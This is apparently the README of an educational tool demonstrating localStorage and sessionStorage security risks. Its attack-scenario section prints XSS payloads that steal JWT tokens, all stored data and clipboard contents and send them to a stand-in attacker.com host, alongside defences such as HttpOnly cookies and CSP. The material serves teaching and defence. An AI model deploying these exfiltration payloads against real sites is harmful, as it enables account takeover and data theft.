# LocalStorage Playground - Webストレージの危険性の学習・体験ツール

![GitHub Repo stars](https://img.shields.io/github/stars/ipusiron/localstorage-playground?style=social)
![GitHub forks](https://img.shields.io/github/forks/ipusiron/localstorage-playground?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/ipusiron/localstorage-playground)
![GitHub license](https://img.shields.io/github/license/ipusiron/localstorage-playground)
[![GitHub Pages](https://img.shields.io/badge/demo-GitHub%20Pages-blue?logo=github)](https://ipusiron.github.io/localstorage-playground/)

**Day038 - 生成AIで作るセキュリティツール100**

**LocalStorage Playground** は、ブラウザの `localStorage` や `sessionStorage` に保存されるデータの構造やセキュリティリスクを可視化・体験できる軽量な教育向けツールです。

---

## 🌐 デモページ

👉 [https://ipusiron.github.io/localstorage-playground/](https://ipusiron.github.io/localstorage-playground/)

---

## 📸 スクリーンショット

> ![ストレージに認証情報をセット](assets/screenshot.png)  
>
> *ストレージに認証情報をセット*

---

## 🎯 主な機能

- `localStorage` / `sessionStorage` に保存されたデータの一覧表示
- 任意のキー・値の追加・削除
- ストレージのクリア機能（片方または両方）
- ページリロードによる永続性テスト
- `localStorage` と `sessionStorage` の違いを視覚的に比較
- セキュリティ警告の表示（アクセス可能性・XSS盗難リスク）
- （オプション）XSSによる`localStorage`盗難のデモ

---

## 🧪 使用技術

- HTML / CSS / JavaScript（Vanilla JS）
- `localStorage`, `sessionStorage`, `DOM`, `EventListener`
- （一部：`innerHTML`や`eval()` の安全な取り扱い）

---

## 📚 学べること

- Web Storage APIの基本と構造
- クライアントストレージにおけるセキュリティ上の注意点
- XSSと組み合わさることでの深刻な情報漏洩例
- `HttpOnly Cookie`との違い
- `sessionStorage`の適切な用途と寿命

---

## 🚨 XSSとlocalStorageの組み合わせ攻撃

### 攻撃シナリオ

#### 1. 基本的な攻撃パターン
```javascript
// XSS脆弱性を悪用して、localStorage内のトークンを盗む
<script>
  // JWTトークンの窃取
  const token = localStorage.getItem('jwt_token');
  const userData = localStorage.getItem('user_data');
  
  // 攻撃者のサーバーへ送信
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, userData }),
  });
</script>
```

#### 2. 全データ窃取攻撃
```javascript
// localStorage内の全データを一括で盗む
<script>
  const allData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    allData[key] = localStorage.getItem(key);
  }
  
  // Base64エンコードして送信
  const img = new Image();
  img.src = `https://attacker.com/collect?data=${btoa(JSON.stringify(allData))}`;
</script>
```

#### 3. 持続的攻撃（Persistent XSS）
```javascript
// localStorageにマルウェアを仕込む
<script>
  // 悪意のあるコードをlocalStorageに保存
  localStorage.setItem('app_config', JSON.stringify({
    apiUrl: 'https://attacker.com/api',
    tracking: '<img src=x onerror="alert(document.cookie)">'
  }));
  
  // アプリケーションがこのデータを信頼して使用すると...
  // 継続的にXSSが発生する
</script>
```

### 実際の被害例

| 攻撃タイプ | 被害内容 | 影響度 |
|-----------|---------|--------|
| **認証トークン窃取** | JWTやセッショントークンが盗まれ、なりすましログインが可能に | 🔴 重大 |
| **個人情報漏洩** | ユーザー設定、プロファイル情報、操作履歴などが流出 | 🔴 重大 |
| **アカウント乗っ取り** | 認証情報を使って完全にアカウントを制御される | 🔴 重大 |
| **データ改ざん** | localStorage内のデータを書き換えられ、アプリの動作が異常に | 🟡 中程度 |
| **マルウェア埋め込み** | 永続的な悪意のあるコードが仕込まれる | 🔴 重大 |

### 🔗 関連する攻撃手法

本ツールはlocalStorage/sessionStorageに焦点を当てていますが、実際のXSS攻撃では以下の手法と組み合わされることがあります：

#### 📋 クリップボード攻撃
```javascript
// ユーザーがコピーした機密情報（パスワード、秘密鍵等）を窃取
const clipboardData = await navigator.clipboard.readText();
fetch('https://attacker.com/steal-clipboard', {
  method: 'POST',
  body: clipboardData
});
```

#### 🍪 Cookie窃取
```javascript
// HttpOnlyでないCookieを窃取
document.cookie; // "sessionid=abc123; preferences=dark"
```

#### 📱 デバイス情報収集
```javascript
// ブラウザ・OS・画面解像度等の情報収集
navigator.userAgent;
screen.width + "x" + screen.height;
```

#### 🎯 複合攻撃の例
実際の攻撃では、localStorage/sessionStorage、Cookie、クリップボード、デバイス情報を**同時に窃取**して攻撃者サーバーに送信することで、より大きな被害をもたらします。

⚠️ **重要:** 本ツールはWebストレージのセキュリティリスクの学習に特化していますが、実際のセキュリティ対策では、これらの関連攻撃も含めた包括的な防御策が必要です。

### 防御策

#### ✅ 推奨される対策

1. **機密情報はlocalStorageに保存しない**
   ```javascript
   // ❌ 悪い例
   localStorage.setItem('auth_token', token);
   
   // ✅ 良い例 - HttpOnly Cookieを使用
   // サーバー側で設定:
   // Set-Cookie: auth_token=xxx; HttpOnly; Secure; SameSite=Strict
   ```

2. **Content Security Policy (CSP) の実装**
   ```html
   <meta http-equiv="Content-Security-Policy" 
         content="default-src 'self'; script-src 'self'">
   ```

3. **入力値の適切なサニタイゼーション**
   ```javascript
   // DOMPurifyなどのライブラリを使用
   const clean = DOMPurify.sanitize(userInput);
   ```

4. **トークンの短期化と更新**
   ```javascript
   // トークンに有効期限を設定
   const tokenData = {
     value: 'xxx',
     expires: Date.now() + (15 * 60 * 1000) // 15分
   };
   ```

### セキュアな実装例

```javascript
// セキュアなストレージラッパーの実装
class SecureStorage {
  // 暗号化して保存（完全ではないが、単純な攻撃を防ぐ）
  static setItem(key, value, isPublic = false) {
    if (!isPublic && this.isSensitive(key)) {
      console.warn(`Warning: Storing potentially sensitive data in localStorage`);
      return false;
    }
    
    const data = {
      value: value,
      timestamp: Date.now(),
      checksum: this.generateChecksum(value)
    };
    
    localStorage.setItem(key, JSON.stringify(data));
  }
  
  // 改ざんチェック付きで取得
  static getItem(key) {
    const item = localStorage.getItem(key);
    if (!item) return null;
    
    const data = JSON.parse(item);
    if (this.generateChecksum(data.value) !== data.checksum) {
      console.error('Data tampering detected!');
      localStorage.removeItem(key);
      return null;
    }
    
    return data.value;
  }
  
  static isSensitive(key) {
    const sensitivePatterns = ['token', 'password', 'secret', 'key', 'auth'];
    return sensitivePatterns.some(pattern => 
      key.toLowerCase().includes(pattern)
    );
  }
  
  static generateChecksum(value) {
    // 簡易的なチェックサム（本番環境では適切なハッシュ関数を使用）
    return btoa(JSON.stringify(value)).slice(-10);
  }
}
```

### ⚠️ 重要な注意点

- **localStorage/sessionStorageは、XSS攻撃に対して無防備です**
- **JWTトークンやAPIキーなどの機密情報は絶対に保存しないでください**
- **HttpOnly Cookieを使用することで、JavaScriptからのアクセスを防げます**
- **定期的なセキュリティ監査とペネトレーションテストを実施してください**

---

## 📁 ディレクトリー構成

```
localstorage-playground/
├── index.html                 # メインHTMLファイル
├── style.css                  # CSSスタイル（レスポンシブ・ダークモード対応）
├── main.js                    # エントリーポイント（ES6モジュール）
├── modules/                   # 機能別モジュール
│   ├── tabs.js               # タブ切り替え管理
│   ├── storage.js            # ストレージ操作（メイン機能）
│   │                         # - 容量統計・エクスポート・編集・削除
│   │                         # - プリセットデータ・検索・フィルタリング
│   │                         # - リアルタイム更新・インタラクティブテスト
│   ├── xss.js                # XSSデモ機能
│   └── learn.js              # 学習コンテンツ（比較表・ベストプラクティス）
├── CLAUDE.md                 # 開発ドキュメント（Claude向け）
├── README.md                 # プロジェクト説明書
├── LICENSE                   # MITライセンス
└── assets/                   # 静的リソース
    └── screenshot.png        # デモスクリーンショット
```

---

### ⚙️ 実装済み機能一覧

| 機能カテゴリ | 実装内容 | 状態 |
|--------------|----------|------|
| **🎛️ UI/UX** | タブベースのナビゲーション、レスポンシブデザイン、ダークモード対応 | ✅ 完成 |
| **📦 ストレージ操作** | データ保存・編集・削除、リアルタイム表示更新、ダブルクリック編集 | ✅ 完成 |
| **📊 統計・分析** | 容量制限テスト、使用量可視化、プログレスバー表示 | ✅ 完成 |
| **📤 エクスポート** | JSON/CSV形式でのデータ書き出し、プレビュー機能 | ✅ 完成 |
| **🎯 プリセット** | カテゴリ別サンプルデータ、危険なデータ例、ワンクリック挿入 | ✅ 完成 |
| **🔍 検索・フィルタ** | キー/値検索、ストレージタイプフィルタ、データ型フィルタ | ✅ 完成 |
| **🧪 インタラクティブテスト** | 永続性テスト、オリジンポリシー、容量制限チェック | ✅ 完成 |
| **📚 学習コンテンツ** | ストレージ比較表、セキュリティベストプラクティス | ✅ 完成 |
| **💥 XSSデモ** | 基本的なXSS攻撃シミュレーション、サンプルスクリプト | 🔄 基本実装済み |
| **🔧 モジュール設計** | ES6モジュール分割、保守性向上、コンポーネント化 | ✅ 完成 |

---

| バージョン      | 内容                                 |
| ---------- | ---------------------------------- |
| **v1**（現行） | 3タブUI・基本操作（表示・保存・削除）・XSSデモ実装済み     |
| **v2**（次）  | UI強化（モバイル対応改善・視覚強調・アニメーション・警告表示など） |
| **v3**（将来） | 機能追加（個別削除、暗号化保存シミュレート、安全性レベル診断など）  |

---

## 📄 ライセンス

MIT License - 詳細は [LICENSE](LICENSE) をご覧ください。

---

## 🛠 このツールについて

本ツールは、「生成AIで作るセキュリティツール100」プロジェクトの一環として開発されました。 このプロジェクトでは、AIの支援を活用しながら、セキュリティに関連するさまざまなツールを100日間にわたり制作・公開していく取り組みを行っています。

プロジェクトの詳細や他のツールについては、以下のページをご覧ください。

🔗 [https://akademeia.info/?page_id=42163](https://akademeia.info/?page_id=42163)
